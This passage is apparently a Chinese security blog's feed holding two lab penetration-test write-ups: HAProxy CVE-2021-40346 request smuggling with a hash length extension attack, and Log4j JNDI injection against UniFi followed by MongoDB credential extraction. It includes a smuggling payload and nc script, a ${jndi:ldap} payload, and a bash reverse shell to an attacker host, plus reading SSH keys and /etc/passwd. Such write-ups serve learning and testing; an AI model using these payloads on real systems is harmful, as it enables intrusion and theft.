    <title>从HAProxy请求走私到hash长度拓展攻击</title>
    <link href="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/"/>
    <url>/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<p>声明：虚拟环境演示</p><p>打开站点发现是用gitea搭建的，而且左上角探索点进去直接发现了user，以及整个网站的架构</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_10-44.png" class="" title="2024-03-07_10-44.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_10-45.png" class="" title="2024-03-07_10-45.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>进入该user项目当中，在最底部发现了HA-Proxy,并且版本是2.2.16</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_10-45_1.png" class="" title="2024-03-07_10-45_1.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>心中闪过一个念头，CVE-2021-40346？？？于是尝试进行HAProxy请求走私；该漏洞是一个整数溢出漏洞，可以进行HTTP请求走私攻击，这种攻击允许攻击者将HTTP请求“走私”到后端服务器，而代理服务器不知道这一点，走私的请求会产生各种影响，比如：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">绕过安全控制，包括 HAProxy 中定义的任何 ACL<br>未经授权访问敏感数据<br>执行未经授权的命令或修改数据<br>劫持用户会话<br>无需用户交互即可利用反射型 XSS 漏洞<br></code></pre></td></tr></table></figure><p>HTTP请求走私它基于干扰前端服务器（即HAProxy）和后端服务器之间的HTTP请求处理。攻击者通常通过发送特制的请求来利用此技术，该请求的正文中包含附加请求，成功攻击后，内部请求会通过前端走私（前端将其视为仅请求的正文），但会被后端作为正常请求使用<br>常利用的攻击场景——绕过 http 请求 ACL：触发HTTP请求走私攻击以绕过HAProxy定义的ACL规则</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-08_09-27.png" class="" title="2024-03-08_09-27.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>payload:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /guest HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: xx.xxxxx.xx:<span class="hljs-number">10001</span><br><span class="hljs-attribute">Content</span>-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">23</span><br><br><span class="hljs-attribute">GET</span> /admin HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">h</span>:GET /guest HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: xx.xxxxx.xx:<span class="hljs-number">10001</span><br></code></pre></td></tr></table></figure><p>参考文章：<a href="https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/">https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/</a></p><p>接下来利用ha代理漏洞，通过尝试请求走私访问子域，fuzz一下子域</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-23.png" class="" title="2024-03-07_11-23.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><p>抓包，通过payload构造数据包，如果用burp的话，需要关掉burp的自动内容长度更新，然后自己根据实际请求手动指定Content-Length</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-15.png" class="" title="2024-03-07_11-15.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-19.png" class="" title="2024-03-07_11-19.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>根据payload,可以写一个bash脚本，通过整数溢出导致的请求走私来读取敏感信息</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs swift">#<span class="hljs-operator">!/</span>bin<span class="hljs-operator">/</span>bash<br><br>path<span class="hljs-operator">=</span><span class="hljs-variable">$1</span><br>cl<span class="hljs-operator">=</span>$((<span class="hljs-number">16</span><span class="hljs-operator">+</span>`echo <span class="hljs-variable">$path</span> <span class="hljs-operator">|</span> wc <span class="hljs-operator">-</span>m`))<br>caixukun<span class="hljs-operator">=</span><span class="hljs-string">&quot;POST / HTTP/1.1<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Host: ouija.htb<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Content-Length: $cl<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>GET $path HTTP/1.1<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>h:GET / HTTP/1.1<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Host: ouija.htb<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>&quot;</span><br><br>echo <span class="hljs-operator">-</span>ne <span class="hljs-variable">$caixukun</span> <span class="hljs-operator">|</span> nc <span class="hljs-operator">-</span>w <span class="hljs-number">1</span> ouija.htb <span class="hljs-number">80</span> <span class="hljs-operator">|</span> sed <span class="hljs-operator">-</span>n &#x27;<span class="hljs-number">428</span>,<span class="hljs-variable">$p</span>&#x27;<br></code></pre></td></tr></table></figure><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-22.png" class="" title="2024-03-07_11-22.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>尝试访问子域，发现了两个敏感文件，一个js和一个bash脚本</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-26.png" class="" title="2024-03-07_11-26.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>尝试读取，发现可以读取成功<br>app.js</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-32_1.png" class="" title="2024-03-07_11-32_1.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>init.sh:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(date)</span> api config starts&quot;</span> &gt;&gt;<br><span class="hljs-built_in">mkdir</span> -p .config/bin .config/local .config/share /var/log/zapi<br><span class="hljs-built_in">export</span> k=$(<span class="hljs-built_in">cat</span> /opt/auth/api.key)<br><span class="hljs-built_in">export</span> botauth_id=<span class="hljs-string">&quot;bot1:bot&quot;</span><br><span class="hljs-built_in">export</span> <span class="hljs-built_in">hash</span>=<span class="hljs-string">&quot;4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1&quot;</span><br><span class="hljs-built_in">ln</span> -s /proc .config/bin/process_informations<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(date)</span> api config done&quot;</span> &gt;&gt; /var/log/zapi/api.log<br><br><span class="hljs-built_in">exit</span> 1<br></code></pre></td></tr></table></figure><p>在前期信息收集阶段，发现了一个3000端口，访问了users路由，提示缺少ihash header，测试添加后提示缺少identification header，添加identification后也是token无效</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_10-37.png" class="" title="2024-03-07_10-37.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>在init.sh脚本里面有个api.log的日志文件，再次尝试读取，发现读不到，审计js代码，发现接口只有&#x2F;file&#x2F;get可以工作，并且如果要调用这个api的话，需要hearder identification和ihash才能访问</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-57.png" class="" title="2024-03-07_11-57.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><p>那说明和那个3000端口有联系？而identification和ihash也存在init.sh里面，那带上identification和ihash试试？</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">curl -H &#x27;ihash: 4b22a<span class="hljs-number">041884</span>7a<span class="hljs-number">51650623</span>a458acc1bba5c01f<span class="hljs-number">6521</span>ea<span class="hljs-number">613587</span>2b9f15b56b988c1&#x27; -H <span class="hljs-string">&quot;identification: `echo -ne bot1:bot | xxd -plain | base64`&quot;</span> <span class="hljs-string">&quot;http://ouija.htb:3000/users&quot;</span><br></code></pre></td></tr></table></figure><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-44.png" class="" title="2024-03-07_11-44.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>好好好，直接给我说没权限..继续审计js代码，发现想要调用&#x2F;file&#x2F;get功能，需要过了ensure_auth函数校验。此函数又调用了verify_cookies和d函数，分别是一个sha256和base64+hex</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-59.png" class="" title="2024-03-07_11-59.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_12-00.png" class="" title="2024-03-07_12-00.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><p>而且我发现在检查identification是否存在::admin:True时连接出错，貌似只是简单地进行存在性检查，那如果我的identification包含::admin:True和其他字符，是否就可以绕过？？</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-57_1.png" class="" title="2024-03-07_11-57_1.png"><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><p>综上，现有情况就是：我们知道所需的部分明文和函数加密方式，以及目标hash，但并不知道所需的长度是多少，在这种场景可以进行hash长度扩展攻击，我觉得暴破长度总比暴破密钥简单多了吧，上脚本</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_13-48.png" class="" title="2024-03-07_13-48.png"><h6 id="-16"><a href="#-16" class="headerlink" title=""></a></h6><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_14-29.png" class="" title="2024-03-07_14-29.png"><h6 id="-17"><a href="#-17" class="headerlink" title=""></a></h6><p>这样一来，就获得了以管理员身份访问端口3000的权限，就可以利用&#x2F;file&#x2F;get接口读取敏感信息，先尝试读取一下刚才的那两个文件，发现成功读取init.sh</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_14-32.png" class="" title="2024-03-07_14-32.png"><h6 id="-18"><a href="#-18" class="headerlink" title=""></a></h6><p>可以发现，init.sh里有一行“ln -s &#x2F;proc .config&#x2F;bin&#x2F;process_informations”，是个软链接，所以我们可以利用这个软链接通过proc过去来读取其他文件（刚才我为啥没注意到），尝试读取&#x2F;etc&#x2F;passwd</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_14-33.png" class="" title="2024-03-07_14-33.png"><h6 id="-19"><a href="#-19" class="headerlink" title=""></a></h6><p>既然这样，我们就可以尝试读取.ssh目录，如果有私钥，就可以直接窃取私钥进行ssh免密登录，从而拿下控制权限</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_14-35.png" class="" title="2024-03-07_14-35.png"><h6 id="-20"><a href="#-20" class="headerlink" title=""></a></h6><p>okk，加上一开始就泄漏了一个用户名，尝试ssh登录</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_14-38.png" class="" title="2024-03-07_14-38.png"><h6 id="-21"><a href="#-21" class="headerlink" title=""></a></h6><p>这个时候其实已经拿下了，但进都进去了，不得看看？所以下面的就是写着玩的</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-08_11-03.png" class="" title="2024-03-08_11-03.png"><h6 id="-22"><a href="#-22" class="headerlink" title=""></a></h6><p>发现根目录下面有个development文件夹，在里面有一个网站的架构目录和一些文件</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_14-42.png" class="" title="2024-03-07_14-42.png"><h6 id="-23"><a href="#-23" class="headerlink" title=""></a></h6><p>审计一下index.php，发现用户名和密码被传递给函数say_lverifier</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_14-43.png" class="" title="2024-03-07_14-43.png"><h6 id="-24"><a href="#-24" class="headerlink" title=""></a></h6><p>查看一下&#x2F;usr&#x2F;lib&#x2F;php下的文件，发现了一个lverifier.so，它与被调用的函数名称很相似，而且它是可读的，下载到本地，然后逆向分析一下</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_14-45.png" class="" title="2024-03-07_14-45.png"><h6 id="-25"><a href="#-25" class="headerlink" title=""></a></h6><p>这里我用chisel搭建隧道，将流量代理出来，方便下载lverifier.so</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_15-26.png" class="" title="2024-03-07_15-26.png"><h6 id="-26"><a href="#-26" class="headerlink" title=""></a></h6><p>浅浅逆向分析一下</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_17-57.png" class="" title="2024-03-07_17-57.png"><h6 id="-27"><a href="#-27" class="headerlink" title=""></a></h6><p>我看到在调用say_lverifier函数之后，程序继续调用validating_userinput函数</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_18-05.png" class="" title="2024-03-07_18-05.png"><h6 id="-28"><a href="#-28" class="headerlink" title=""></a></h6><p>sVar2是输入内容的大小，它的数据类型是 size_t，这个类型的最大值是 0xffff，即65535，当我插入一个长度超过这个数字的字符串时，它会发生溢出，并进入上述的检查情况。随后程序将调用 event_recorder函数来执行文件保存操作</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_19-10.png" class="" title="2024-03-07_19-10.png"><h6 id="-29"><a href="#-29" class="headerlink" title=""></a></h6><p>哎 太菜了…分析不动了<br>吃午饭了</p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>由Log4j引起的MongoDB提权</title>
    <link href="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/"/>
    <url>/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<p>开局一个登录框，是一个UniFi Network,而且版本信息直接打印在登陆页</p><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_08-27.png" class="" title="2024-03-06_08-27.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>那就直接根据版本信息上google搜一下看看，有没有CVE可以利用或者默认用户名密码尝试弱口令登陆，搜索发现了存在log4j漏洞</p><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_08-29.png" class="" title="2024-03-06_08-29.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>log4j漏洞可通过注入操作系统命令来利用，使得攻击者可以在运行应用程序的服务器上执行任意操作系统命令，从而完全破坏应用程序并破坏其数据<br>简述一下该漏洞的原理：<br>org.apache.logging.log4j.core.pattern.MessagePatternConverter类的format()方法发现日志中包含“${”就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身，从而导致攻击者构造符合要求的表达式供系统执行。“${”可使用的关键词非常多，例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;java:os&#125;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;hostName&#125;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;jndi:logging/context-name&#125;</span><br></code></pre></td></tr></table></figure><p>org.apache.logging.log4j.core.lookup.StrSubstitutor中提取参数并通过lookup进行内容替换，当日志在打印时遇到”${“后，Interpolator类以:号作为分割，将表达式内容分割成两部分，前面部分作为prefix，后面部分作为key,然后通过prefix去找对应的lookup，通过对应的lookup实例调用lookup方法，最后将key作为参数带入执行，经典poc:${jndi:ldap:&#x2F;&#x2F;liuty_ip&#x2F;exp}，相信大家看到这个poc就会想到jndi注入，没错，当JNDI变量可控时引发的漏洞，它将导致远程class文件加载，从而导致远程代码执行，当刚才那个poc被传入到log4j日志文件中，lookup会将JNDI注入可执行语句执行，程序会通过ldap协议访问liuty_ip这个地址，然后liuty_ip就会返回一个包含java代码的class文件的地址，然后再通过返回的地址下载class文件并执行，从而达成恶意攻击的效果，我用ppt简单画一下漏洞利用过程</p><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_12-37.png" class="" title="2024-03-06_12-37.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>为了验证漏洞存在的真实性，我们可以在向&#x2F;api&#x2F;login发出POST请求后，进行抓包拦截，将payload输入到remember参数中，因为POST数据作为JSON对象发送，并且payload包含{}，为了防止它被解析为另一个JSON对象，我们将其括在””内，以便将其解析为字符串，这里将remember的true修改为”${jndi:ldap:&#x2F;&#x2F;my_ip&#x2F;随意}”。<br>（这里显示InvalidPayload无效，但实际上payload正在运行）</p><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_08-42.png" class="" title="2024-03-06_08-42.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>为什么这么说呢？我们可以用tcpdump进行流量的监听，在发送带有payload的数据包那一刻，是有流量被监听到的，所以说payload实际是运行的，也证实了漏洞的存在</p><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_08-41.png" class="" title="2024-03-06_08-41.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><p>接下来进行漏洞的利用，借助到一个工具rogue-jndi（rogue），这个工具需要我们自己mvn构建成jar包，构建成功后会生成在target目录当中，如下</p><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-09.png" class="" title="2024-03-06_09-09.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>构建成功之后，运行rogue后会启动一个LDAP服务器并可以使目标服务器接收连接并执行恶意代码，首先构造并传递一个payload，该payload负责在目标服务器上为我们提供一个shell，方便交互式的控制目标服务器，不过要先对payload进行Base64编码，防止出现一些编码问题，最后控制目标服务器进行解码并执行即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;bash -c bash -i &gt;&amp;/dev/tcp/liuty_ip/port 0&gt;&amp;1&#x27;</span> | <span class="hljs-built_in">base64</span><br></code></pre></td></tr></table></figure><p>随后启动rogue，同时将payload作为command参数的一部分以及将我们的攻击机IP传递给hostname参数，并同时打开监听端口</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">java -jar target/RogueJndi-<span class="hljs-number">1.1</span><span class="hljs-selector-class">.jar</span> <span class="hljs-attr">--command</span> <span class="hljs-string">&quot;bash -c &#123;echo,上一步加密完的指令&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> <span class="hljs-attr">--hostname</span> <span class="hljs-string">&quot;攻击（监听）ip&quot;</span><br></code></pre></td></tr></table></figure><p>回到我们抓包的请求当中，加入payload，构造POST请求，将remember的值改为rogue中mapping值</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-string">&quot;remember&quot;</span>: <span class="hljs-string">&quot;<span class="hljs-subst">$&#123;jndi:ldap:<span class="hljs-regexp">//m</span>y_ip:<span class="hljs-number">1389</span>/o=xxxxx&#125;</span></span><br></code></pre></td></tr></table></figure><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-20.png" class="" title="2024-03-06_09-20.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>发送请求后，收到一个与我们ldap服务器的连接情况，并且监听端口会接收到反弹过来的shell</p><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-21.png" class="" title="2024-03-06_09-21.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>拿到shell之后，先改变一下shell,使其变得交互，往往渗透过程中交互式的shell还是很重要的</p><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-22.png" class="" title="2024-03-06_09-22.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>通过查看进程，发现MongoDB数据库开着，端口为27117,进程中也没别的数据库了，应该就是UniFi的后台数据库吧</p><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-23.png" class="" title="2024-03-06_09-23.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>查阅资料可知，UniFi默认数据库的名称一般为ace，通过mongo命令尝试提取管理员密码来与MongoDB服务进行交互</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">mongo <span class="hljs-attr">--port</span> <span class="hljs-number">27117</span> ace <span class="hljs-attr">--eval</span> &quot;db<span class="hljs-selector-class">.admin</span><span class="hljs-selector-class">.find</span>()<span 